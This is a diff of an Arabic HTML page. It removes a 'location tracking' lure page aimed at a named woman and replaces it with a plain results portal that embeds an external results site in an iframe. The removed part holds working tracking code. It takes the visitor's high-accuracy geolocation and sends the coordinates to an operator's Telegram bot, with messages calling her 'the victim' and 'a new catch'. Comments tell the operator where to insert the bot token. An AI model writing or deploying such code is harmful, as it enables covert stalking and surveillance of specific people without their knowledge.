@@ -3,193 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تتبع الموقع - فاطمة مصطفى</title>
+    <title>Monty Go SDN - الاستعلام عن النتيجة</title>
     <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            font-family: Tahoma, Arial, sans-serif;
         }
-
-        body {
-            background-color: #050505;
-            color: #fff;
-            font-family: 'Courier New', Courier, monospace;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        body, html {
+            width: 100%;
+            height: 100%;
             overflow: hidden;
-            position: relative;
+            background-color: #f4f7f6;
         }
-
-        /* تأثير ألوان الشرطة (أحمر وأزرق متحرك) */
-        .police-lights {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            pointer-events: none;
-            mix-blend-mode: screen;
-            animation: policeFlash 1.5s infinite;
-        }
-
-        @keyframes policeFlash {
-            0% { background: radial-gradient(circle, rgba(0,0,255,0.4) 0%, rgba(0,0,0,0.8) 70%); }
-            50% { background: radial-gradient(circle, rgba(255,0,0,0.4) 0%, rgba(0,0,0,0.8) 70%); }
-            100% { background: radial-gradient(circle, rgba(0,0,255,0.4) 0%, rgba(0,0,0,0.8) 70%); }
-        }
-
-        /* خطوط الشبكة الغامضة في الخلفية */
-        .grid-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
-                              linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-            background-size: 20px 20px;
-            z-index: 2;
-        }
-
-        /* محتوى الصفحة */
-        .container {
-            position: relative;
-            z-index: 3;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 40px;
-            background: rgba(0, 0, 0, 0.85);
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
-            border-radius: 8px;
-            max-width: 450px;
-            width: 90%;
-        }
-
-        .radar-circle {
-            width: 80px;
-            height: 80px;
-            border: 2px dashed #00ffcc;
-            border-radius: 50%;
-            margin: 0 auto 20px auto;
-            animation: spin 4s linear infinite;
+        .header {
+            background-color: #1b365d;
+            color: white;
+            padding: 10px 20px;
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            justify-content: center;
+            height: 50px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
-
-        .radar-dot {
-            width: 10px;
-            height: 10px;
-            background-color: #ff3333;
-            border-radius: 50%;
-            box-shadow: 0 0 10px #ff3333;
-            animation: pulse 1s infinite alternate;
-        }
-
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(0.8); opacity: 0.5; }
-            100% { transform: scale(1.2); opacity: 1; }
-        }
-
-        h1 {
-            font-size: 24px;
-            margin-bottom: 15px;
-            letter-spacing: 1px;
-            color: #f1f1f1;
-        }
-
-        .status {
+        .header h1 {
             font-size: 18px;
-            color: #00ffcc;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            animation: blinkText 1s infinite;
         }
-
-        @keyframes blinkText {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
+        .header span {
+            font-size: 14px;
+            color: #b0c4de;
         }
-
-        .coords {
-            font-size: 13px;
-            color: #888;
-            margin-top: 15px;
-            margin-bottom: 20px;
+        .container {
+            width: 100%;
+            height: calc(100% - 50px);
         }
-
-        /* توقيع Monty Go SDN */
-        .signature {
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            padding-top: 15px;
-            font-size: 11px;
-            letter-spacing: 2px;
-            color: #00ffcc;
-            text-transform: uppercase;
-            opacity: 0.8;
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="police-lights"></div>
-    <div class="grid-overlay"></div>
-
-    <div class="container">
-        <div class="radar-circle">
-            <div class="radar-dot"></div>
-        </div>
-        <h1>فاطمة مصطفى</h1>
-        <div class="status" id="status-text">جاري تحديد الموقع...</div>
-        <div class="coords" id="coords-text">SYS_LOC_TRACKING // SECURE_TARGET</div>
-        
-        <div class="signature">Monty Go SDN</div>
+    <div class="header">
+        <h1>Monty Go SDN - بوابة النتائج</h1>
+        <span>خدمات الاستعلام الإلكتروني</span>
     </div>
 
-    <script>
-        // ضع هنا بيانات بوت التليجرام الخاص بك (Token و Chat ID) لتصلك البيانات مباشرة
-        const botToken = "YOUR_BOT_TOKEN_HERE";
-        const chatId = "YOUR_CHAT_ID_HERE";
-
-        function sendToTelegram(dataMessage) {
-            if(botToken === "YOUR_BOT_TOKEN_HERE") return; // للتنبيه فقط إذا لم تقم بإضافتها
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(dataMessage)}`;
-            fetch(url).catch(err => console.log(err));
-        }
-
-        // محاولة سحب الإحداثيات الجغرافية عبر المتصفح
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    
-                    // تحديث النص في الصفحة (اختياري، لو عايز تبين ليها إنه تم تحديد مكانها)
-                    document.getElementById('status-text').innerText = "تم تحديد الموقع بنجاح";
-                    document.getElementById('coords-text').innerText = `LAT: ${lat.toFixed(4)} | LON: ${lon.toFixed(4)}`;
-
-                    // إرسال الإحداثيات لبوت التليجرام
-                    sendToTelegram(`🚨 صيد جديد - فاطمة مصطفى!\n📍 الخطوط: ${lat}\n📍 الأعمدة: ${lon}\n🎯 الدقة: ${accuracy} متر`);
-                },
-                function(error) {
-                    document.getElementById('status-text').innerText = "فشل في التقاط الإحداثيات";
-                    sendToTelegram(`⚠️ فشل التقاط الموقع للضحية. الخطأ: ${error.message}`);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        } else {
-            document.getElementById('status-text').innerText = "المتصفح لا يدعم التتبع";
-        }
-    </script>
+    <div class="container">
+        <!-- نافذة تضمين الرابط المطلوب -->
+        <iframe src="https://result.sd/" title="نظام النتائج"></iframe>
+    </div>
 
 </body>
 </html>
